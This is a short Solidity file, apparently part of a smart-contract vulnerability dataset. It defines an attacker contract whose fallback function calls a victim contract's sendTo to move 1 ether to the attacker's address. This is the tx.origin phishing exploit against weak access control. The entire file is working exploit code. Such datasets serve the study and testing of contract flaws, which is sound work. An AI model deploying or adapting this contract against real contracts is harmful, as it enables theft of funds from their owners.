pragma solidity ^0.4.24;

import "../dataset/access_control/mycontract.sol";

contract MyContractAttacker {
    MyContract phishableContract;
    address attacker; // The attackers address to receive funds.

    constructor(
        MyContract _phishableContract,
        address _attackerAddress
    ) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function() public payable {
        phishableContract.sendTo(attacker, 1 ether);
    }
}
